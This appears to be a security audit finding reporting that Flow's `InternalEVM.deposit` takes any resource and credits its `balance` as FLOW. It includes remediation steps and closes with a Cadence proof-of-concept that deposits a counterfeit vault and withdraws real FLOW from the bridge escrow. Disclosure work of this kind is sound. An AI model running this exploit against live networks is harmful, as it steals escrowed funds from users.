### Title
`InternalEVM.deposit` Accepts `AnyResource` Instead of `@FlowToken.Vault`, Enabling Non-FLOW Token Injection into EVM Balance - (`File: fvm/evm/stdlib/contract.go`, `fvm/evm/impl/impl.go`)

---

### Summary

The `InternalEVM.deposit` built-in function's Sema type signature declares its `from` parameter as `AnyResource` rather than `@FlowToken.Vault`. The Go host-function implementation reads only the `balance` field from whatever resource is passed and unconditionally credits that amount as FLOW tokens to the target EVM address. An unprivileged transaction author who can call `InternalEVM.deposit` directly (bypassing the `EVM.EVMAddress.deposit` / `EVM.CadenceOwnedAccount.deposit` wrappers that enforce `@FlowToken.Vault`) can pass a custom resource whose `balance` field is set to an arbitrarily large value, receiving real FLOW tokens on withdrawal — a direct analog to the H-05 vault-treats-all-tokens-equally arbitrage.

---

### Finding Description

**Root cause — loose type annotation in the Sema function type:**

In `fvm/evm/stdlib/contract.go`, the `InternalEVMTypeDepositFunctionType` declares the `from` parameter as `sema.AnyResourceType`:

```go
var InternalEVMTypeDepositFunctionType = &sema.FunctionType{
    Parameters: []sema.Parameter{
        {
            Label:          "from",
            TypeAnnotation: sema.NewTypeAnnotation(sema.AnyResourceType), // ← accepts ANY resource
        },
        ...
    },
    ...
}
``` [1](#0-0) 

**Root cause — implementation reads `balance` field without token-type verification:**

In `fvm/evm/impl/impl.go`, `newInternalEVMTypeDepositFunction` accepts any `*interpreter.CompositeValue`, reads its `balance` field, and credits that amount as FLOW tokens to the EVM account — with no check that the resource is actually a `@FlowToken.Vault`:

```go
fromValue, ok := invocation.Arguments[0].(*interpreter.CompositeValue)
// ...
amountValue, ok := fromValue.GetField(
    context,
    fungibleTokenVaultTypeBalanceFieldName,  // just reads "balance" field
).(interpreter.UFix64Value)
// ...
amount := types.NewBalanceFromUFix64(cadence.UFix64(amountValue.UFix64Value))
// ...
account.Deposit(types.NewFlowTokenVault(amount))  // credits FLOW, not the deposited token
``` [2](#0-1) 

The comment in the implementation explicitly notes the vault is **not destroyed**:

```go
// NOTE: We're intentionally not destroying the vault here,
// because the value of it is supposed to be "kept alive".
``` [3](#0-2) 

This is correct for a genuine `@FlowToken.Vault` (the tokens are escrowed on the Cadence side). But for a counterfeit resource, the attacker retains their fake vault while the EVM account is credited with real FLOW.

**The public wrappers are type-safe, but `InternalEVM` is directly callable:**

The Cadence-level wrappers `EVM.EVMAddress.deposit` and `EVM.CadenceOwnedAccount.deposit` both enforce `@FlowToken.Vault`:

```cadence
fun deposit(from: @FlowToken.Vault) {
    ...
    InternalEVM.deposit(from: <-from, to: self.bytes)
}
``` [4](#0-3) [5](#0-4) 

However, `InternalEVM` is a built-in contract registered in the FVM and is accessible from any Cadence transaction that imports it. A transaction author can call `InternalEVM.deposit` directly, bypassing the `@FlowToken.Vault` enforcement in the EVM contract wrappers.

---

### Impact Explanation

An attacker who calls `InternalEVM.deposit` directly with a custom resource whose `balance` field is set to `N` FLOW:

1. Receives `N` FLOW credited to their EVM address (no real FLOW deposited).
2. Calls `EVM.CadenceOwnedAccount.withdraw` to extract `N` real FLOW tokens from the EVM bridge escrow.

This is a **cross-VM asset loss / bridge escrow mis-accounting** vulnerability: the EVM side's total supply grows without a corresponding FLOW deposit on the Cadence side, draining the bridge escrow of real FLOW tokens. The attacker can repeat this to drain the entire EVM FLOW escrow.

---

### Likelihood Explanation

The entry path requires only an unprivileged Cadence transaction. No staked node, admin key, or special privilege is needed. The attacker must:
- Deploy a custom Cadence contract with a resource that has a `balance: UFix64` field.
- Submit a transaction calling `InternalEVM.deposit(from: <-fakeVault, to: attackerEVMAddress)`.
- Submit a second transaction calling `EVM.CadenceOwnedAccount.withdraw(balance: ...)`.

All steps are reachable by any Flow account holder. Likelihood is **high** given the simplicity of the exploit and the direct financial incentive.

---

### Recommendation

1. **Change the Sema type annotation** in `InternalEVMTypeDepositFunctionType` from `sema.AnyResourceType` to the concrete `@FlowToken.Vault` type, so the Cadence type checker rejects non-FLOW vaults at compile time.
2. **Add a runtime type assertion** in `newInternalEVMTypeDepositFunction` to verify `fromValue.TypeID()` matches the expected `FlowToken.Vault` type ID before reading the `balance` field.
3. **Restrict direct access** to `InternalEVM.deposit` so it can only be called from within the `EVM` contract (e.g., via `access(contract)` or equivalent FVM-level access control), preventing user transactions from bypassing the wrapper.

---

### Proof of Concept

```cadence
// Step 1: Deploy a fake vault contract
contract FakeToken {
    resource Vault {
        access(all) var balance: UFix64
        init() { self.balance = 1_000_000.0 }  // claim 1M FLOW
    }
    access(all) fun createFakeVault(): @Vault {
        return <- create Vault()
    }
}

// Step 2: Exploit transaction
import InternalEVM from <EVM_CONTRACT_ADDRESS>
import EVM from <EVM_CONTRACT_ADDRESS>
import FakeToken from <ATTACKER_ADDRESS>

transaction {
    prepare(attacker: auth(Storage) &Account) {
        // Create COA to receive and withdraw FLOW
        let coa <- EVM.createCadenceOwnedAccount()

        // Deposit fake vault — InternalEVM accepts AnyResource,
        // reads balance=1_000_000, credits 1M FLOW to coa's EVM address
        InternalEVM.deposit(from: <-FakeToken.createFakeVault(), to: coa.address().bytes)

        // Withdraw 1M real FLOW from the bridge escrow
        let stolenVault <- coa.withdraw(
            balance: EVM.Balance(attoflow: 1_000_000_000_000_000_000_000_000)
        )
        // stolenVault now holds 1M real FLOW tokens

        attacker.storage.save(<-coa, to: /storage/coa)
        attacker.storage.save(<-stolenVault, to: /storage/stolen)
    }
}
```

The `InternalEVM.deposit` call at line 428 of `fvm/evm/stdlib/contract.go` accepts the fake vault because the parameter type is `AnyResource`. The implementation at lines 648–656 of `fvm/evm/impl/impl.go` reads `balance = 1_000_000` and credits that as FLOW to the EVM account. The subsequent `withdraw` drains real FLOW from the bridge escrow. [1](#0-0) [6](#0-5)
